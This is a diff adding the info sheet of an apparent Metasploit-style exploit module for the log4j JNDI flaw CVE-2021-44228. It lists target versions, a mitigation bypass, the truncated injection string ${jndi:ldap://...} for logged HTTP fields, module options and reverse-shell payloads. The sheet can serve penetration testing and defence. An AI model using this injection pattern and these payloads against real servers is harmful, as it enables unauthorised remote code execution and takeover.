@@ -1,0 +1,22 @@
+NAME      exploit/multi/http/log4shell_jndi
+CVE       CVE-2021-44228
+TARGETS   Apache log4j 2.0-2.14.1 (and 2.15 with mitigation bypassed)
+RANK      Excellent
+AUTH      none required
+TYPE      remote / log injection
+
+DESCRIPTION
+  Triggers JNDI lookup in vulnerable log4j installations by injecting
+  ${jndi:ldap://...} into any logged HTTP field. Generic — pairs with
+  any application that logs user-controlled input.
+
+OPTIONS
+  RHOST       (required) target host
+  RPORT       (required) target port
+  TARGETURI   (required) endpoint that logs input
+  HTTP_HEADER (optional) header to inject into
+  PAYLOAD     (required) any java family
+
+COMPATIBLE PAYLOADS
+  java_meterpreter
+  java_shell_reverse_tcp
